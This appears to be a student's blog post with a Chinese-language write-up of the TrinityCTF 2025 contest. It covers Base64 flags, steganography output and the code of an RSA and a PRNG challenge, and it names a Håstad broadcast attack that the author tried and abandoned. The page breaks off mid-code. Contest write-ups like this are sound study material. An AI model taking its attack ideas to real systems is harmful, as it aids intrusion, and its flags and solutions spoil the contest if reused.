<!DOCTYPE html>
<html data-color-mode="light" data-dark-theme="dark_colorblind" data-light-theme="light" lang="zh-CN">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
    <script defer src='https://cdn.jsdelivr.net/npm/mermaid@11.4.0/dist/mermaid.min.js'></script><script>document.addEventListener('DOMContentLoaded', function() { mermaid.initialize({startOnLoad: true, theme: 'default', securityLevel: 'loose'}); });</script>
    <link rel="icon" href="https://nopthon.github.io/burger.svg"><script>
        let theme = localStorage.getItem("meek_theme") || "light";
        document.documentElement.setAttribute("data-color-mode", theme);
    </script>
<meta name="description" content="ä¸€ä¸ªé›¶ CTF ç»éªŒçš„å¤§äºŒè€ç™»å‚åŠ äº†æ ¡å†…çš„é¢å‘æ–°ç”Ÿçš„ CTF æ¯”èµ›ï¼Œ

è¿™æ˜¯ä»–çš„ Writeup å‘ç”Ÿçš„å˜åŒ–ï¼š

~~AI è¿˜æ˜¯å¤ªå¥½ç”¨äº†~~ ~~AI å†™çš„éƒ½å•¥ä»£ç ~~ æˆ‘é”™äº†

---

### Misc01-CTF_101

> æ¬¢è¿å‚èµ›TrinityCTF!
>
> ä½œä¸ºä¸€åå‚èµ›é€‰æ‰‹ä½ é¦–å…ˆéœ€è¦çœ‹çœ‹é¶åœº, çœ‹çœ‹å…¬å‘Š, ç¡®ä¿äº†è§£æ¯”èµ›è§„åˆ™è¯¦æƒ…!
>
> å–„ç”¨äº’è”ç½‘å’Œå·¥å…·, å¸Œæœ›ä½ èƒ½åœ¨è¿™åœºæ¯”èµ›ä¸­å­¦ä¹ , ç»ƒä¹ ; æˆ–æ˜¯åˆ‡èº«æ„Ÿå—ä¸‹CTFèµ›äº‹çš„æ°›å›´ä¸æŒ‘æˆ˜
>
> å¦‚æœä½ å‘ç°ä½ ä¸ä¼šçš„è¿˜æŒºå¤š, ~~é‚£å°±å¯¹äº†~~ æˆ‘ä»¬æ¯ä¸€åé˜Ÿå‘˜éƒ½æ˜¯è¿™ä¹ˆæˆé•¿èµ·æ¥çš„, èµ›åæˆ‘ä»¬ä¹Ÿä¼šç»„ç»‡WPè®²è§£, æ¬¢è¿æ¥å¬ å¦‚æœä½ å‘ç°ä½ éƒ½ä¼š, å•Šé‚£å¤ªå¥½äº†. è¯·åœ¨è¿™åœºæ¯”èµ›å°½æƒ…æ€é¢˜~~ç„¶åå¤§ä½¬å¸¦é£æˆ‘ä»¬æˆ˜é˜ŸæŠŠğŸ˜†~~
>
> æœ€åç¥å„ä½è§£é¢˜é¡ºåˆ©.

ç„¶åå°±è¦å¡« Flag äº†ï¼Œæ³¨æ„åˆ°åœ¨å‡ å¤©å‰å‘å¸ƒçš„ TrinityCTF 2025 coming èµ›äº‹é¢„å‘Šä¸­æœ‰ï¼š

> æœ€åç¥å¤§å®¶å‚èµ›æ„‰å¿«~~ZmxhZ3toNHBweV9oNGNrMW41IX0=~~å–å¾—å¥½æˆç»©

Base64 ä¸€ä¸‹è¢«åˆ’çº¿çš„ä¹±ç å¾—åˆ° `flag{h4ppy_h4ck1n5!}`



### Misc02-æœæ‰“æ’¤

æä¾›äº†ä¸€ä¸ª py æ–‡ä»¶å’Œæ‘©æ–¯ç”µç æœ¬ï¼Œpy æ–‡ä»¶è¿è¡Œåæ˜¯ä¸€ä¸ªæ–‡å­—å†’é™©æ¸¸æˆï¼Œåœ¨æ¸¸ç©è¿‡ç¨‹ä¸­å¯ä»¥è·å¾—flagç¢ç‰‡ï¼Œå®é™…ä¸Šå¯ä»¥ç›´æ¥ç¿» py æ–‡ä»¶ï¼š

```python
WORK_SECRET = os.getenv('WORK_SECRET', 'dzBySw==')					# Base64: w0rK
COMBINE_SECRET = os.getenv('COMBINE_SECRET', 'YzBtYkluZSBhbDE=')	# Base64: c0mbIne al1
PASSWORD1 = os.getenv('PASSWORD1', 'TkpVZXI=')						# Base64: NJUer
PASSWORD2 = os.getenv('PASSWORD2', 'UEtVZXI=')						# Base64: PKUer
FLAG_SECRET = os.getenv('FLAG_SECRET', 'ZmxhZw==')					# Base64: flag
# çœç•¥ä¸€éƒ¨åˆ†å†…å®¹...
def exit_gate():
    '''æ ¡é—¨æ’¤ç¦»ç‚¹'''
    print('ç¥è´ºä½ å¾—åˆ°äº†æƒ³è¦çš„ä¸œè¥¿ã€‚">
<meta property="og:title" content="TrinityCTF 2025 Writeup">
<meta property="og:description" content="ä¸€ä¸ªé›¶ CTF ç»éªŒçš„å¤§äºŒè€ç™»å‚åŠ äº†æ ¡å†…çš„é¢å‘æ–°ç”Ÿçš„ CTF æ¯”èµ›ï¼Œ

è¿™æ˜¯ä»–çš„ Writeup å‘ç”Ÿçš„å˜åŒ–ï¼š

~~AI è¿˜æ˜¯å¤ªå¥½ç”¨äº†~~ ~~AI å†™çš„éƒ½å•¥ä»£ç ~~ æˆ‘é”™äº†

---

### Misc01-CTF_101

> æ¬¢è¿å‚èµ›TrinityCTF!
>
> ä½œä¸ºä¸€åå‚èµ›é€‰æ‰‹ä½ é¦–å…ˆéœ€è¦çœ‹çœ‹é¶åœº, çœ‹çœ‹å…¬å‘Š, ç¡®ä¿äº†è§£æ¯”èµ›è§„åˆ™è¯¦æƒ…!
>
> å–„ç”¨äº’è”ç½‘å’Œå·¥å…·, å¸Œæœ›ä½ èƒ½åœ¨è¿™åœºæ¯”èµ›ä¸­å­¦ä¹ , ç»ƒä¹ ; æˆ–æ˜¯åˆ‡èº«æ„Ÿå—ä¸‹CTFèµ›äº‹çš„æ°›å›´ä¸æŒ‘æˆ˜
>
> å¦‚æœä½ å‘ç°ä½ ä¸ä¼šçš„è¿˜æŒºå¤š, ~~é‚£å°±å¯¹äº†~~ æˆ‘ä»¬æ¯ä¸€åé˜Ÿå‘˜éƒ½æ˜¯è¿™ä¹ˆæˆé•¿èµ·æ¥çš„, èµ›åæˆ‘ä»¬ä¹Ÿä¼šç»„ç»‡WPè®²è§£, æ¬¢è¿æ¥å¬ å¦‚æœä½ å‘ç°ä½ éƒ½ä¼š, å•Šé‚£å¤ªå¥½äº†. è¯·åœ¨è¿™åœºæ¯”èµ›å°½æƒ…æ€é¢˜~~ç„¶åå¤§ä½¬å¸¦é£æˆ‘ä»¬æˆ˜é˜ŸæŠŠğŸ˜†~~
>
> æœ€åç¥å„ä½è§£é¢˜é¡ºåˆ©.

ç„¶åå°±è¦å¡« Flag äº†ï¼Œæ³¨æ„åˆ°åœ¨å‡ å¤©å‰å‘å¸ƒçš„ TrinityCTF 2025 coming èµ›äº‹é¢„å‘Šä¸­æœ‰ï¼š

> æœ€åç¥å¤§å®¶å‚èµ›æ„‰å¿«~~ZmxhZ3toNHBweV9oNGNrMW41IX0=~~å–å¾—å¥½æˆç»©

Base64 ä¸€ä¸‹è¢«åˆ’çº¿çš„ä¹±ç å¾—åˆ° `flag{h4ppy_h4ck1n5!}`



### Misc02-æœæ‰“æ’¤

æä¾›äº†ä¸€ä¸ª py æ–‡ä»¶å’Œæ‘©æ–¯ç”µç æœ¬ï¼Œpy æ–‡ä»¶è¿è¡Œåæ˜¯ä¸€ä¸ªæ–‡å­—å†’é™©æ¸¸æˆï¼Œåœ¨æ¸¸ç©è¿‡ç¨‹ä¸­å¯ä»¥è·å¾—flagç¢ç‰‡ï¼Œå®é™…ä¸Šå¯ä»¥ç›´æ¥ç¿» py æ–‡ä»¶ï¼š

```python
WORK_SECRET = os.getenv('WORK_SECRET', 'dzBySw==')					# Base64: w0rK
COMBINE_SECRET = os.getenv('COMBINE_SECRET', 'YzBtYkluZSBhbDE=')	# Base64: c0mbIne al1
PASSWORD1 = os.getenv('PASSWORD1', 'TkpVZXI=')						# Base64: NJUer
PASSWORD2 = os.getenv('PASSWORD2', 'UEtVZXI=')						# Base64: PKUer
FLAG_SECRET = os.getenv('FLAG_SECRET', 'ZmxhZw==')					# Base64: flag
# çœç•¥ä¸€éƒ¨åˆ†å†…å®¹...
def exit_gate():
    '''æ ¡é—¨æ’¤ç¦»ç‚¹'''
    print('ç¥è´ºä½ å¾—åˆ°äº†æƒ³è¦çš„ä¸œè¥¿ã€‚">
<meta property="og:type" content="article">
<meta property="og:url" content="https://Nopthon.github.io/post/TrinityCTF%202025%20Writeup.html">
<meta property="og:image" content="https://nopthon.github.io/burger.svg">
<title>TrinityCTF 2025 Writeup</title>
<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />


</head>
<style>
body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
#footer {margin-top:64px; text-align: center;font-size: small;}

</style>

<style>
.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
.title-right{display:flex;margin:auto 0 0 auto;}
.title-right .circle{padding: 14px 16px;margin-right:8px;}
#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
#postBody hr{height:2px;}
#cmButton{height:48px;margin-top:48px;}
#comments{margin-top:64px;}
.g-emoji{font-size:24px;}
@media (max-width: 600px) {
    body {padding: 8px;}
    .postTitle{font-size:24px;}
}
.copy-feedback {
    display: none;
    position: absolute;
    top: 10px;
    right: 50px;
    color: var(--color-fg-on-emphasis);
    background-color: var(--color-fg-muted);
    border-radius: 3px;
    padding: 5px 8px;
    font-size: 12px;
}
</style>
<style>
pre, code, pre code {
    tab-size: 4 !important;
    -moz-tab-size: 4 !important;
}
.mermaid {
    background-color: white;
    border-radius: 8px;
    padding: 16px;
    margin: 16px 0;
    text-align: center;
}
</style><style>.markdown-alert{padding:0.5rem 1rem;margin-bottom:1rem;border-left:.25em solid var(--borderColor-default,var(--color-border-default));}.markdown-alert .markdown-alert-title {display:flex;font-weight:var(--base-text-weight-medium,500);align-items:center;line-height:1;}.markdown-alert>:first-child {margin-top:0;}.markdown-alert>:last-child {margin-bottom:0;}</style><style>.markdown-alert.markdown-alert-warning {border-left-color:var(--borderColor-attention-emphasis, var(--color-attention-emphasis));background-color:var(--color-attention-subtle);}.markdown-alert.markdown-alert-warning .markdown-alert-title {color: var(--fgColor-attention,var(--color-attention-fg));}</style>



<body>
    <div id="header">
<h1 class="postTitle">TrinityCTF 2025 Writeup</h1>
<div class="title-right">
    <a href="https://Nopthon.github.io" id="buttonHome" class="btn btn-invisible circle" title="é¦–é¡µ">
        <svg class="octicon" width="16" height="16">
            <path id="pathHome" fill-rule="evenodd"></path>
        </svg>
    </a>
    
    <a href="https://github.com/Nopthon/Nopthon.github.io/issues/6" target="_blank" class="btn btn-invisible circle" title="Issue">
        <svg class="octicon" width="16" height="16">
            <path id="pathIssue" fill-rule="evenodd"></path>
        </svg>
    </a>
    

    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="åˆ‡æ¢ä¸»é¢˜">
        <svg class="octicon" width="16" height="16" >
            <path id="themeSwitch" fill-rule="evenodd"></path>
        </svg>
    </a>

</div>
</div>
    <div id="content">
<div class="markdown-body" id="postBody"><p>ä¸€ä¸ªé›¶ CTF ç»éªŒçš„å¤§äºŒè€ç™»å‚åŠ äº†æ ¡å†…çš„é¢å‘æ–°ç”Ÿçš„ CTF æ¯”èµ›ï¼Œ</p>
<p>è¿™æ˜¯ä»–çš„ Writeup å‘ç”Ÿçš„å˜åŒ–ï¼š</p>
<p><del>AI è¿˜æ˜¯å¤ªå¥½ç”¨äº†</del> <del>AI å†™çš„éƒ½å•¥ä»£ç </del> æˆ‘é”™äº†</p>
<hr>
<h3>Misc01-CTF_101</h3>
<blockquote>
<p>æ¬¢è¿å‚èµ›TrinityCTF!</p>
<p>ä½œä¸ºä¸€åå‚èµ›é€‰æ‰‹ä½ é¦–å…ˆéœ€è¦çœ‹çœ‹é¶åœº, çœ‹çœ‹å…¬å‘Š, ç¡®ä¿äº†è§£æ¯”èµ›è§„åˆ™è¯¦æƒ…!</p>
<p>å–„ç”¨äº’è”ç½‘å’Œå·¥å…·, å¸Œæœ›ä½ èƒ½åœ¨è¿™åœºæ¯”èµ›ä¸­å­¦ä¹ , ç»ƒä¹ ; æˆ–æ˜¯åˆ‡èº«æ„Ÿå—ä¸‹CTFèµ›äº‹çš„æ°›å›´ä¸æŒ‘æˆ˜</p>
<p>å¦‚æœä½ å‘ç°ä½ ä¸ä¼šçš„è¿˜æŒºå¤š, <del>é‚£å°±å¯¹äº†</del> æˆ‘ä»¬æ¯ä¸€åé˜Ÿå‘˜éƒ½æ˜¯è¿™ä¹ˆæˆé•¿èµ·æ¥çš„, èµ›åæˆ‘ä»¬ä¹Ÿä¼šç»„ç»‡WPè®²è§£, æ¬¢è¿æ¥å¬ å¦‚æœä½ å‘ç°ä½ éƒ½ä¼š, å•Šé‚£å¤ªå¥½äº†. è¯·åœ¨è¿™åœºæ¯”èµ›å°½æƒ…æ€é¢˜<del>ç„¶åå¤§ä½¬å¸¦é£æˆ‘ä»¬æˆ˜é˜ŸæŠŠğŸ˜†</del></p>
<p>æœ€åç¥å„ä½è§£é¢˜é¡ºåˆ©.</p>
</blockquote>
<p>ç„¶åå°±è¦å¡« Flag äº†ï¼Œæ³¨æ„åˆ°åœ¨å‡ å¤©å‰å‘å¸ƒçš„ TrinityCTF 2025 coming èµ›äº‹é¢„å‘Šä¸­æœ‰ï¼š</p>
<blockquote>
<p>æœ€åç¥å¤§å®¶å‚èµ›æ„‰å¿«~~ZmxhZ3toNHBweV9oNGNrMW41IX0=~~å–å¾—å¥½æˆç»©</p>
</blockquote>
<p>Base64 ä¸€ä¸‹è¢«åˆ’çº¿çš„ä¹±ç å¾—åˆ° <code class="notranslate">flag{h4ppy_h4ck1n5!}</code></p>
<h3>Misc02-æœæ‰“æ’¤</h3>
<p>æä¾›äº†ä¸€ä¸ª py æ–‡ä»¶å’Œæ‘©æ–¯ç”µç æœ¬ï¼Œpy æ–‡ä»¶è¿è¡Œåæ˜¯ä¸€ä¸ªæ–‡å­—å†’é™©æ¸¸æˆï¼Œåœ¨æ¸¸ç©è¿‡ç¨‹ä¸­å¯ä»¥è·å¾—flagç¢ç‰‡ï¼Œå®é™…ä¸Šå¯ä»¥ç›´æ¥ç¿» py æ–‡ä»¶ï¼š</p>
<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-c1">WORK_SECRET</span> <span class="pl-c1">=</span> <span class="pl-s1">os</span>.<span class="pl-c1">getenv</span>(<span class="pl-s">'WORK_SECRET'</span>, <span class="pl-s">'dzBySw=='</span>)					<span class="pl-c"># Base64: w0rK</span>
<span class="pl-c1">COMBINE_SECRET</span> <span class="pl-c1">=</span> <span class="pl-s1">os</span>.<span class="pl-c1">getenv</span>(<span class="pl-s">'COMBINE_SECRET'</span>, <span class="pl-s">'YzBtYkluZSBhbDE='</span>)	<span class="pl-c"># Base64: c0mbIne al1</span>
<span class="pl-v">PASSWORD1</span> <span class="pl-c1">=</span> <span class="pl-s1">os</span>.<span class="pl-c1">getenv</span>(<span class="pl-s">'PASSWORD1'</span>, <span class="pl-s">'TkpVZXI='</span>)						<span class="pl-c"># Base64: NJUer</span>
<span class="pl-v">PASSWORD2</span> <span class="pl-c1">=</span> <span class="pl-s1">os</span>.<span class="pl-c1">getenv</span>(<span class="pl-s">'PASSWORD2'</span>, <span class="pl-s">'UEtVZXI='</span>)						<span class="pl-c"># Base64: PKUer</span>
<span class="pl-c1">FLAG_SECRET</span> <span class="pl-c1">=</span> <span class="pl-s1">os</span>.<span class="pl-c1">getenv</span>(<span class="pl-s">'FLAG_SECRET'</span>, <span class="pl-s">'ZmxhZw=='</span>)					<span class="pl-c"># Base64: flag</span>
<span class="pl-c"># çœç•¥ä¸€éƒ¨åˆ†å†…å®¹...</span>
<span class="pl-k">def</span> <span class="pl-en">exit_gate</span>():
    <span class="pl-s">"""æ ¡é—¨æ’¤ç¦»ç‚¹"""</span>
    <span class="pl-en">print</span>(<span class="pl-s">"ç¥è´ºä½ å¾—åˆ°äº†æƒ³è¦çš„ä¸œè¥¿ã€‚æŒ‰ç…§é€šé¡ºçš„è¯­è¨€ä¹ æƒ¯ç»„åˆå³å¯ã€‚ä¸è¦å¿˜è®°åœ¨å•è¯ä¹‹é—´åŠ å…¥çŸ­ä¸‹åˆ’çº¿_å“¦~"</span>)
    <span class="pl-k">return</span> <span class="pl-c1">1</span></pre></div>
<p>æŠŠä¸‰ä¸ª secret æŒ‰ç…§è¯­åºæ‹¼æ¥å¾—åˆ° <code class="notranslate">flag{c0mbIne_al1_w0rK}</code> ï¼ˆä¸€å¼€å§‹æˆ‘ä¸€ç›´å°è¯•æŠŠ <code class="notranslate">NJUer</code> å¡è¿›å»ğŸ˜°ï¼‰</p>
<h3>Misc03-Watch the Star</h3>
<p>æä¾›äº†ä¸€ä¸ª <code class="notranslate">coords.txt</code> è®°å½•äº†è‹¥å¹²ä¸ªç‚¹åæ ‡ï¼Œä»¥åŠä¸€ä¸ª <code class="notranslate">star.png</code> ç»˜åˆ¶äº†éƒ¨åˆ†ç‚¹çš„ä½ç½®å’Œè¿çº¿</p>
<p>ç”¨ matplotlib åº“ç»˜å›¾ï¼Œå‘ç°è¿çº¿æ²¡æœ‰ä»»ä½•çº¿ç´¢ï¼Œä½†æ˜¯ç‚¹çš„æ’å¸ƒå¾ˆæœ‰æ„æ€ï¼ˆç‰¹åˆ«æ˜¯â†–â†—â†™ä¸‰ä¸ªè§’çš„æš—ç¤ºï¼‰</p>
<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/6f4d3c21acbcf9a438b6cd69fd8f7fa1a04714e6050acd7a388cfbcc89a1c871/68747470733a2f2f6e6f7074686f6e2e6769746875622e696f2f696d6167652d32303235313030363130333434343630322e706e67"><img src="https://camo.githubusercontent.com/6f4d3c21acbcf9a438b6cd69fd8f7fa1a04714e6050acd7a388cfbcc89a1c871/68747470733a2f2f6e6f7074686f6e2e6769746875622e696f2f696d6167652d32303235313030363130333434343630322e706e67" alt="image-20251006103444602" data-canonical-src="https://nopthon.github.io/image-20251006103444602.png" style="max-width: 100%;"></a></p>
<p>æŠŠç‚¹æ›¿æ¢æˆå¤§å°ä¸º1çš„æ–¹æ ¼ï¼Œåˆ å»è¿çº¿ï¼Œå¾—åˆ°ï¼š</p>
<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/4a3d482116c0a21075fa8c120ac713d4a7d54a3ef65a5564995e18a10cf00f34/68747470733a2f2f6e6f7074686f6e2e6769746875622e696f2f696d6167652d32303235313030363130343330303037312e706e67"><img src="https://camo.githubusercontent.com/4a3d482116c0a21075fa8c120ac713d4a7d54a3ef65a5564995e18a10cf00f34/68747470733a2f2f6e6f7074686f6e2e6769746875622e696f2f696d6167652d32303235313030363130343330303037312e706e67" alt="image-20251006104300071" data-canonical-src="https://nopthon.github.io/image-20251006104300071.png" style="max-width: 100%;"></a></p>
<p>æ˜¯ä¸ªäºŒç»´ç ï¼Œæ‰«æå¾—åˆ° <code class="notranslate">flag:bWlzY19maW5pc2g=</code>ï¼Œ Base64 ä¸€ä¸‹å¾—åˆ° <code class="notranslate">flag{misc_finish}</code></p>
<h3><strong>Misc04-çŒ«çŒ«</strong>ï¼ˆUnfinishedï¼‰</h3>
<p>å›¾ç‰‡é‡Œè—äº†ä¸€ä¸ª zip æ–‡ä»¶ç”¨ binwalk åˆ†ç¦»ï¼Œå‹ç¼©åŒ…é‡Œæœ‰ <code class="notranslate">flag.txt</code> ä½†æ˜¯è§£å‹éœ€è¦å¯†ç </p>
<p>å¯¹å‰©ä¸‹çš„çº¯å›¾ç‰‡å†…å®¹ zsteg ä¸€ä¸‹å‘ç°ä¸‹é¢çš„å†…å®¹ï¼š</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">imagedata           .. text: <span class="pl-s"><span class="pl-pds">"</span>.55/4.,-)<span class="pl-pds">"</span></span>
b1,g,lsb,xy         .. text: <span class="pl-s"><span class="pl-pds">"</span>-M<span class="pl-smi">$ED</span>%LtLm<span class="pl-cce">\\\\</span>uT<span class="pl-pds">"</span></span>
b1,b,lsb,xy         .. text: <span class="pl-s"><span class="pl-pds">"</span>5m,5<span class="pl-smi">$5</span>l4ee}----(<span class="pl-pds">"</span></span>
b2,r,lsb,xy         .. text: <span class="pl-s"><span class="pl-pds">"</span>D@@EDkDD<span class="pl-pds">"</span></span>
b2,rgb,lsb,xy       .. text: <span class="pl-s"><span class="pl-pds">"</span>L0DDTAA@E<span class="pl-pds">"</span></span>
b2,rgb,msb,xy       .. text: <span class="pl-s"><span class="pl-pds">"</span>\n{&lt;g[6e{<span class="pl-pds">"</span></span>
b3,g,msb,xy         .. file: OpenPGP Secret Key
b4,r,lsb,xy         .. text: <span class="pl-s"><span class="pl-pds">"</span>2222<span class="pl-cce">\"</span>2R2#5TTDDTTUETFfvvvvgvvvv<span class="pl-pds">"</span></span>
b4,r,msb,xy         .. text: <span class="pl-s"><span class="pl-pds">"</span>];;;;;;{<span class="pl-pds">"</span></span>
b4,g,lsb,xy         .. text: <span class="pl-s"><span class="pl-pds">"</span>223#323323ETTEUUTggTvvggvgwgvy<span class="pl-pds">"</span></span>
b4,b,lsb,xy         .. text: <span class="pl-s"><span class="pl-pds">"</span>wvfgwvvfwv<span class="pl-pds">"</span></span>
b4,rgb,lsb,xy       .. text: <span class="pl-s"><span class="pl-pds">"</span>A62s&amp;3p5<span class="pl-pds">"</span></span>
b4,rgb,msb,xy       .. text: <span class="pl-s"><span class="pl-pds">"</span>,Fb<span class="pl-smi">$Nb$N</span><span class="pl-pds">"</span></span>
b4,bgr,lsb,xy       .. text: <span class="pl-s"><span class="pl-pds">"</span>QB63r6 s<span class="pl-pds">"</span></span>
b4,bgr,msb,xy       .. text: <span class="pl-s"><span class="pl-pds">"</span>J&amp;dB.dB.<span class="pl-pds">"</span></span></pre></div>
<p>ä¸ä¼šè§£ï¼Œé‚æ”¾å¼ƒ</p>
<h3>Misc05-å¡«å¡«é—®å·å°±èƒ½æ‹¿åˆ†è°¢è°¢å–µ</h3>
<p>å­—é¢æ„æ€ï¼Œè¿™æˆ‘è¿˜èƒ½è¯´ä»€ä¹ˆå‘¢ï¼Œå¤ªæ€§æƒ…äº†å“¥ä»¬ï¼Œflag æ²¡ä¿å­˜æ‰€ä»¥ä¸è´´äº†</p>
<p>ps: æˆ‘æ‹¿çš„ä¸€è¡€ğŸ¤“</p>
<hr>
<h3>Crypto01-RSA (Unfinished)</h3>
<p>ä¸€ä¸ªèœå•ç¯å¢ƒï¼Œæä¾›äº†ç¦»çº¿çš„ Python æ­å»ºï¼š</p>
<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-k">from</span> <span class="pl-v">Crypto</span>.<span class="pl-v">Util</span>.<span class="pl-s1">number</span> <span class="pl-k">import</span> <span class="pl-s1">bytes_to_long</span>
<span class="pl-k">import</span> <span class="pl-s1">os</span>, <span class="pl-s1">signal</span>
<span class="pl-k">import</span> <span class="pl-s1">utils</span>

<span class="pl-s1">signal</span>.<span class="pl-c1">alarm</span>(<span class="pl-c1">600</span>)								<span class="pl-c"># 600s çš„é™æ—¶ï¼Œä¹Ÿå°±æ˜¯ TLE æœºåˆ¶ï¼ˆï¼Ÿ</span>
<span class="pl-k">assert</span> <span class="pl-s1">utils</span>.<span class="pl-c1">PoW</span>()								<span class="pl-c"># ä¸€ä¸ªéœ€è¦æš´åŠ›ç®— sha256 çš„å·¥ä½œé‡è¯æ˜</span>
<span class="pl-s1">sec</span> <span class="pl-c1">=</span> <span class="pl-s1">os</span>.<span class="pl-c1">urandom</span>(<span class="pl-c1">16</span>)

<span class="pl-c1">MENU</span> <span class="pl-c1">=</span> <span class="pl-s">'''</span>
<span class="pl-s">[E]ncrypt</span>
<span class="pl-s">[G]etFlag</span>
<span class="pl-s">[Q]uit</span>
<span class="pl-s">'''</span>
<span class="pl-k">while</span> <span class="pl-c1">True</span>:
    <span class="pl-en">print</span>(<span class="pl-c1">MENU</span>)
    <span class="pl-s1">inp</span> <span class="pl-c1">=</span> <span class="pl-en">input</span>(<span class="pl-s">"&gt;"</span>).<span class="pl-c1">lower</span>()
    <span class="pl-k">try</span>:
        <span class="pl-k">if</span> <span class="pl-s1">inp</span> <span class="pl-c1">==</span> <span class="pl-s">"q"</span>:							<span class="pl-c"># q é”®é€€å‡º</span>
            <span class="pl-k">raise</span> <span class="pl-v">Exception</span>

        <span class="pl-k">elif</span> <span class="pl-s1">inp</span> <span class="pl-c1">==</span> <span class="pl-s">"e"</span>:						<span class="pl-c"># e é”®ä¼šæä¾›ä¸€ä¸ªç”¨ç›¸åŒçš„å…¬é’¥æŒ‡æ•° e=4027 å’Œæ˜æ–‡ï¼Œç”¨ä¸åŒçš„æ¨¡æ•°åŠ å¯†çš„ç»“æœ</span>
            <span class="pl-s1">rsa</span> <span class="pl-c1">=</span> <span class="pl-s1">utils</span>.<span class="pl-c1">RSA</span>(<span class="pl-s1">nbits</span><span class="pl-c1">=</span><span class="pl-c1">1024</span>)
            <span class="pl-s1">c</span> <span class="pl-c1">=</span> <span class="pl-s1">rsa</span>.<span class="pl-c1">encrypt</span>(<span class="pl-en">bytes_to_long</span>(<span class="pl-s1">sec</span>))
            <span class="pl-en">print</span>(<span class="pl-s">f"<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">rsa</span>.<span class="pl-c1">pub</span> <span class="pl-c1">=</span> <span class="pl-kos">}</span></span><span class="pl-cce">\n</span><span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">c</span> <span class="pl-c1">=</span> <span class="pl-kos">}</span></span>"</span>)

        <span class="pl-k">elif</span> <span class="pl-s1">inp</span> <span class="pl-c1">==</span> <span class="pl-s">"g"</span>:						<span class="pl-c"># g é”®ç”¨è§£å‡ºçš„æ˜æ–‡æ¢å– flag</span>
            <span class="pl-k">assert</span> <span class="pl-s1">sec</span> <span class="pl-c1">==</span> <span class="pl-s1">bytes</span>.<span class="pl-c1">fromhex</span>(<span class="pl-en">input</span>(<span class="pl-s">"sec&gt;"</span>).<span class="pl-c1">strip</span>())
            <span class="pl-s1">utils</span>.<span class="pl-c1">solve</span>()
            <span class="pl-k">raise</span> <span class="pl-v">Exception</span>

    <span class="pl-k">except</span>:
        <span class="pl-k">break</span></pre></div>
<p>èµ›æ—¶è€ƒè™‘ä½¿ç”¨ <strong>HÃ¥stadå¹¿æ’­æ”»å‡»</strong>ï¼Œéœ€è¦æ”¶é›† 4097 ç»„æ•°æ®ä½†æ˜¯è¢« 600s æ—¶é™å¡ä½äº†ï¼ˆ600s åªèƒ½æ”¶é›† 1k ç»„ä¸åˆ°çš„æ•°æ®ï¼Œè€Œ 1k ç»„æ•°æ®ç ´è§£çš„æ¦‚ç‡å¤ªä½äº†ï¼‰ï¼Œé‚ giveup</p>
<p><strong>Crypto02-PQC</strong>  å’Œ <strong>Crypto03-ECC</strong> éƒ½æ²¡ç¢°</p>
<h3>Crypto04-PRNG</h3>
<p>å››é“ Crypto çš„ç¯å¢ƒæ­å»ºéƒ½æ˜¯ç›¸ä¼¼çš„ï¼š</p>
<p><code class="notranslate">task.py</code></p>
<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-k">import</span> <span class="pl-s1">signal</span>
<span class="pl-k">import</span> <span class="pl-s1">utils</span>

<span class="pl-s1">signal</span>.<span class="pl-c1">alarm</span>(<span class="pl-c1">600</span>)
<span class="pl-k">assert</span> <span class="pl-s1">utils</span>.<span class="pl-c1">PoW</span>()

<span class="pl-s1">casino</span> <span class="pl-c1">=</span> <span class="pl-s1">utils</span>.<span class="pl-c1">CASINO</span>()											<span class="pl-c"># æ„å»ºäº†ä¸€ä¸ª casino çŒœæ•°æ¸¸æˆ</span>
																<span class="pl-c"># åˆå§‹æœ‰ä¸€å®šçš„åˆ†æ•°</span>
<span class="pl-c1">MENU</span> <span class="pl-c1">=</span> <span class="pl-s">'''</span>
<span class="pl-s">[R]efresh</span>
<span class="pl-s">[H]it</span>
<span class="pl-s">[S]tand</span>
<span class="pl-s">[Q]uit</span>
<span class="pl-s">'''</span>
<span class="pl-k">while</span> <span class="pl-c1">True</span>:
    <span class="pl-en">print</span>(<span class="pl-c1">MENU</span>)
    <span class="pl-s1">inp</span> <span class="pl-c1">=</span> <span class="pl-en">input</span>(<span class="pl-s">"&gt;"</span>).<span class="pl-c1">lower</span>()
    <span class="pl-k">try</span>:
        <span class="pl-k">if</span> <span class="pl-s1">inp</span> <span class="pl-c1">==</span> <span class="pl-s">"q"</span>:											<span class="pl-c"># q é”®é€€å‡ºæ¸¸æˆ</span>
            <span class="pl-k">raise</span> <span class="pl-v">Exception</span>
        
        <span class="pl-k">elif</span> <span class="pl-s1">inp</span> <span class="pl-c1">==</span> <span class="pl-s">"r"</span>:										<span class="pl-c"># r é”®é‡ç½®æ¸¸æˆ</span>
            <span class="pl-s1">casino</span>.<span class="pl-c1">refresh</span>()

        <span class="pl-k">elif</span> <span class="pl-s1">inp</span> <span class="pl-c1">==</span> <span class="pl-s">"h"</span>:										<span class="pl-c"># h é”®è¿›è¡ŒçŒœæ•°ï¼Œè¦çŒœçš„æ•°æ˜¯éšæœºæ•°</span>
            <span class="pl-s1">card</span> <span class="pl-c1">=</span> <span class="pl-s1">casino</span>.<span class="pl-c1">card</span>()
